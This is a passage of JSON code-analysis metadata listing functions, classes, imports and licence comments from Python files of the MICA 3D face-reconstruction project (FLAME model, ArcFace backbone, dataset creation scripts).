        "function_defs": [
          "def build_train(config, device):",
          "def build_val(config, device):"
        ],
        "class_defs": [],
        "imports": [
          "import numpy as np",
          "from torch.utils.data import ConcatDataset",
          "from datasets.base import BaseDataset"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/base.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, name, config, device, isEval):",
          "def initialize(self):",
          "def set_smallest_k(self):",
          "def compose_transforms(self, *args):",
          "def get_arcface_path(self, image_path):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class BaseDataset(Dataset, ABC):"
        ],
        "imports": [
          "import os",
          "import re",
          "from abc import ABC",
          "from functools import reduce",
          "from pathlib import Path",
          "import loguru",
          "import numpy as np",
          "import torch",
          "from loguru import logger",
          "from skimage.io import imread",
          "from torch.utils.data import Dataset",
          "from torchvision import transforms"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/utils/landmark_detector.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def __init__(self, model='retinaface', device='cuda:0'):",
          "def detect(self, img):"
        ],
        "class_defs": [
          "class Detectors:",
          "class LandmarksDetector:"
        ],
        "imports": [
          "import face_alignment",
          "import numpy as np",
          "from insightface.app import FaceAnalysis",
          "from loguru import logger",
          "from datasets.creation.util import get_bbox"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# bboxes = get_bbox(img, np.stack(lmks))",
          "# bboxes[:, 4] = detected_faces[:, 4]",
          "# https://github.com/Rubikplayer/flame-fitting/blob/master/data/landmarks_51_annotated.png"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/utils/best_model.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, trainer):",
          "def state_dict(self):",
          "def load_state_dict(self, dict):",
          "def __call__(self, weighted_average, average):",
          "def now(self, median, mean, std):"
        ],
        "class_defs": [
          "class BestModel:"
        ],
        "imports": [
          "import os",
          "import numpy as np",
          "from loguru import logger"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/utils/util.py",
        "docstrings": [],
        "function_defs": [
          "def find_model_using_name(model_dir, model_name):",
          "def visualize_grid(visdict, savepath=None, size=224, dim=1, return_gird=True):"
        ],
        "class_defs": [],
        "imports": [
          "import importlib",
          "import cv2",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import torchvision"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# adapted from pix2pix framework: https://github.com/junyanz/pytorch-CycleGAN-and-pix2pix/blob/master/models/__init__.py#L25",
          "# import \"model_dir/modelname.py\"",
          "# In the file, the class called ModelName() will",
          "# be instantiated. It has to be a subclass of BaseModel,",
          "# and it is case-insensitive.",
          "# if name.lower() == target_model_name.lower() and issubclass(cls, BaseModel):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/utils/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/utils/masking.py",
        "docstrings": [],
        "function_defs": [
          "def to_tensor(array, dtype=torch.float32):",
          "def to_np(array, dtype=np.float32):",
          "def __init__(self, **kwargs):",
          "def __init__(self, config):",
          "def get_faces(self):",
          "def get_mask_face(self):",
          "def get_mask_eyes(self):",
          "def get_mask_forehead(self):",
          "def get_mask_lips(self):",
          "def get_mask_eye_region(self):",
          "def get_mask_lr_eye_region(self):",
          "def get_mask_nose(self):",
          "def get_mask_ears(self):",
          "def get_triangle_face_mask(self):",
          "def get_triangle_eyes_mask(self):",
          "def get_triangle_whole_mask(self):",
          "def get_triangle_mask(self, m):",
          "def make_soft(self, mask, value, degree=4):",
          "def get_binary_triangle_mask(self):",
          "def get_masked_faces(self):",
          "def get_weights_per_triangle(self):",
          "def get_weights_per_vertex(self):",
          "def get_masked_mesh(self, vertices, triangle_mask):"
        ],
        "class_defs": [
          "class Struct(object):",
          "class Masking(nn.Module):"
        ],
        "imports": [
          "import os",
          "import pickle",
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "from trimesh import Trimesh"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/models/lbs.py",
        "docstrings": [],
        "function_defs": [
          "def rot_mat_to_euler(rot_mats):",
          "def find_dynamic_lmk_idx_and_bcoords(vertices, pose, dynamic_lmk_faces_idx,",
          "def vertices2landmarks(vertices, faces, lmk_faces_idx, lmk_bary_coords):",
          "def lbs(betas, pose, v_template, shapedirs, posedirs, J_regressor, parents,",
          "def vertices2joints(J_regressor, vertices):",
          "def blend_shapes(betas, shape_disps):",
          "def batch_rodrigues(rot_vecs, epsilon=1e-8, dtype=torch.float32):",
          "def transform_mat(R, t):",
          "def batch_rigid_transform(rot_mats, joints, parents, dtype=torch.float32):\n\"\"\"\nApplies a batch of rigid transformations to the joints\n\nParameters\n----------\nrot_mats : torch.tensor BxNx3x3\nTensor of rotation matrices\njoints : torch.tensor BxNx3\nLocations of joints"
        ],
        "class_defs": [],
        "imports": [
          "from __future__ import absolute_import",
          "from __future__ import division",
          "from __future__ import print_function",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# Calculates rotation matrix to euler angles",
          "# Careful for extreme cases of eular angles like [0.0, pi, 0.0]",
          "# Extract the indices of the vertices for each face",
          "# BxLx3",
          "# Add shape contribution",
          "# Get the joints",
          "# NxJx3 array",
          "# 3. Add pose blend shapes",
          "# N x J x 3 x 3",
          "# (N x P) x (P, V * 3) -> N x V x 3",
          "# 4. Get the global joint location",
          "# 5. Do skinning:",
          "# W is N x V x (J + 1)",
          "# (N x V x (J + 1)) x (N x (J + 1) x 16)",
          "# Displacement[b, m, k] = sum_{l} betas[b, l] * shape_disps[m, k, l]",
          "# i.e. Multiply each shape displacement by its corresponding beta and",
          "# then sum them.",
          "# Bx1 arrays",
          "# No padding left or right, only add an extra row",
          "# transforms_mat = transform_mat(",
          "#     rot_mats.view(-1, 3, 3),",
          "#     rel_joints.view(-1, 3, 1)).view(-1, joints.shape[1], 4, 4)",
          "# Subtract the joint location at the rest pose",
          "# No need for rotation, since it's identity when at rest",
          "# The last column of the transformations contains the posed joints",
          "# The last column of the transformations contains the posed joints"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/models/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/models/generator.py",
        "docstrings": [],
        "function_defs": [
          "def kaiming_leaky_init(m):",
          "def __init__(self, z_dim, map_hidden_dim, map_output_dim, hidden=2):",
          "def forward(self, z):",
          "def __init__(self, z_dim, map_hidden_dim, map_output_dim, hidden, model_cfg, device, regress=True):",
          "def forward(self, arcface):"
        ],
        "class_defs": [
          "class MappingNetwork(nn.Module):",
          "class Generator(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as Functional",
          "from models.flame import FLAME"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/models/arcface.py",
        "docstrings": [],
        "function_defs": [
          "def conv3x3(in_planes, out_planes, stride=1, groups=1, dilation=1):\n\"\"\"3x3 convolution with padding\"\"\"\nreturn nn.Conv2d(in_planes,\nout_planes,\nkernel_size=3,\nstride=stride,\npadding=dilation,\ngroups=groups,\nbias=False,\ndilation=dilation)",
          "def conv1x1(in_planes, out_planes, stride=1):\n\"\"\"1x1 convolution\"\"\"\nreturn nn.Conv2d(in_planes,\nout_planes,\nkernel_size=1,\nstride=stride,\nbias=False)\n\n\nclass IBasicBlock(nn.Module):",
          "def __init__(self, inplanes, planes, stride=1, downsample=None,",
          "def forward(self, x):",
          "def __init__(self,",
          "def _make_layer(self, block, planes, blocks, stride=1, dilate=False):",
          "def forward(self, x):",
          "def __init__(self, pretrained_path=None, **kwargs):",
          "def freezer(self, layers):",
          "def forward(self, images):",
          "def forward_arcface(self, x):"
        ],
        "class_defs": [
          "class IBasicBlock(nn.Module):",
          "class IResNet(nn.Module):",
          "class Arcface(IResNet):"
        ],
        "imports": [
          "import os",
          "import torch",
          "from loguru import logger",
          "from torch import nn"
        ],
        "comments": [
          "### Taken from https://github.com/deepinsight/insightface/blob/master/recognition/arcface_torch/backbones/iresnet.py",
          "### FROZEN ###"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/models/flame.py",
        "docstrings": [],
        "function_defs": [
          "def to_tensor(array, dtype=torch.float32):",
          "def to_np(array, dtype=np.float32):",
          "def __init__(self, **kwargs):",
          "def __init__(self, config, optimize_basis=False):",
          "def _find_dynamic_lmk_idx_and_bcoords(self, pose, dynamic_lmk_faces_idx,",
          "def _vertices2landmarks(self, vertices, faces, lmk_faces_idx, lmk_bary_coords):\n\"\"\"\nCalculates landmarks by barycentric interpolation\nInput:\nvertices: torch.tensor NxVx3, dtype = torch.float32\nThe tensor of input vertices\nfaces: torch.tensor (N*F)x3, dtype = torch.long\nThe faces of the mesh\nlmk_faces_idx: torch.tensor N X L, dtype = torch.long\nThe tensor with the indices of the faces used to calculate the",
          "def compute_landmarks(self, vertices):",
          "def seletec_3d68(self, vertices):",
          "def project_to_shape_basis(self, shape_vector, shape_as_offset=False):",
          "def compute_distance_to_basis(self, shape_vector, shape_as_offset=False):",
          "def get_std(self):",
          "def compute_closest_shape(self, shape_vector):",
          "def forward(self, shape_params=None, expression_params=None, pose_params=None, eye_pose_params=None, neck_pose_params=None, shape_basis_delta=None):\n\"\"\"\nInput:\nshape_params: N X number of shape parameters\nexpression_params: N X number of expression parameters\npose_params: N X number of pose parameters (6)\nreturn:d\nvertices: N X V X 3\nlandmarks: N X number of landmarks X 3\n\"\"\""
        ],
        "class_defs": [
          "class Struct(object):",
          "class FLAME(nn.Module):"
        ],
        "imports": [
          "import pickle",
          "import loguru",
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "from .lbs import lbs, batch_rodrigues, vertices2landmarks, rot_mat_to_euler"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# The vertices of the template model",
          "# The shape components and expression",
          "# The pose components",
          "#",
          "# Fixing Eyeball and neck rotation",
          "# Static and Dynamic Landmark embeddings for FLAME",
          "# Extract the indices of the vertices for each face",
          "# NxLx3",
          "# def seletec_3d68(self, vertices):",
          "# shape_params = basis dot (shape_vector - average)  # uses properties of the PCA",
          "# shape_vector torch.Size([3, 5023, 3])",
          "# self.v_template torch.Size([5023, 3])",
          "# self.shapedirs torch.Size([5023, 3, 150])",
          "# diff torch.Size([3, 5023, 3])",
          "# shape_params torch.Size([5023, 15069])",
          "# shape_params = basis dot (shape_vector - average)  # uses properties of the PCA",
          "# params = torch.max(torch.min(params, std*-3.0), std*3.0)"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/configs/config.py",
        "docstrings": [],
        "function_defs": [
          "def get_cfg_defaults():",
          "def update_cfg(cfg, cfg_file):",
          "def parse_args():"
        ],
        "class_defs": [],
        "imports": [
          "import argparse",
          "import os",
          "from yacs.config import CfgNode as CN"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Face model",
          "# ---------------------------------------------------------------------------- #",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Dataset",
          "# ---------------------------------------------------------------------------- #",
          "# ---------------------------------------------------------------------------- #",
          "# Mask weights",
          "# ---------------------------------------------------------------------------- #",
          "# ---------------------------------------------------------------------------- #",
          "# Options for training",
          "# ---------------------------------------------------------------------------- #"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/configs/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/testing/stirling/stirling.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import time",
          "from glob import glob",
          "from shutil import copyfile"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# experiments = list(filter(lambda f: 'experiment_' in f, os.listdir('../../output/')))"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/testing/now/now.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import time",
          "from glob import glob",
          "from shutil import copyfile"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/util.py",
        "docstrings": [],
        "function_defs": [
          "def create_folders(folders):",
          "def get_arcface_input(face, img):",
          "def get_image(name, to_rgb=False):",
          "def draw_on(img, faces):",
          "def dist(p1, p2):",
          "def get_center(bboxes, img):",
          "def bbox2point(left, right, top, bottom, type='bbox'):",
          "def get_bbox(image, lmks, bb_scale=1.0):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import os.path as osp",
          "from pathlib import Path",
          "import cv2",
          "import numpy as np",
          "from insightface.utils import face_align",
          "from numpy.lib import math",
          "import cv2"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# from the original insightface.app.face_analysis.py file",
          "# print(landmark.shape)",
          "# x1, y1, x2, y2"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/generator.py",
        "docstrings": [],
        "function_defs": [
          "def _transfer(src, dst):",
          "def _copy(payload):",
          "def __init__(self, instances):",
          "def copy(self):",
          "def preprocess(self):",
          "def arcface(self):",
          "def run(self):"
        ],
        "class_defs": [
          "class Generator:"
        ],
        "imports": [
          "import os",
          "from glob import glob",
          "from multiprocessing import Pool",
          "from pathlib import Path",
          "from typing import List",
          "import cv2",
          "import numpy as np",
          "from insightface.app import FaceAnalysis",
          "from insightface.app.common import Face",
          "from insightface.utils import face_align",
          "from loguru import logger",
          "from tqdm import tqdm",
          "from datasets.creation.instances.instance import Instance",
          "from datasets.creation.util import get_image, get_center, get_arcface_input"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/main.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import numpy as np",
          "import torch",
          "from datasets.creation.generator import Generator",
          "from datasets.creation.instances.bu3dfe import BU3DFE",
          "from datasets.creation.instances.d3dfacs import D3DFACS",
          "from datasets.creation.instances.facewarehouse import FaceWarehouse",
          "from datasets.creation.instances.florence import Florence",
          "from datasets.creation.instances.frgc import FRGC",
          "from datasets.creation.instances.lyhm import LYHM",
          "from datasets.creation.instances.pb4d import PB4D",
          "from datasets.creation.instances.stirling import Stirling"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/instance.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_dst(self):",
          "def get_src(self):",
          "def get_min_det_score(self):",
          "def preprocess(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
          "def get_meshes(self):",
          "def transform_mesh(self, path):",
          "def transform_image(self, img):",
          "def transform_path(self, file):",
          "def get_rotations(self):",
          "def update_obj(self, path, fix_mtl=False):"
        ],
        "class_defs": [
          "class Instance:"
        ],
        "imports": [
          "import os",
          "from abc import abstractmethod",
          "from pathlib import Path",
          "from pytorch3d.transforms import RotateAxisAngle"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/d3dfacs.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):"
        ],
        "class_defs": [
          "class D3DFACS(Instance, ABC):"
        ],
        "imports": [
          "from abc import ABC",
          "from glob import glob",
          "from pathlib import Path",
          "from datasets.creation.instances.instance import Instance"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/creation/instances/lyhm.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def get_images(self):",
          "def get_flame_params(self):",
          "def get_registrations(self):",
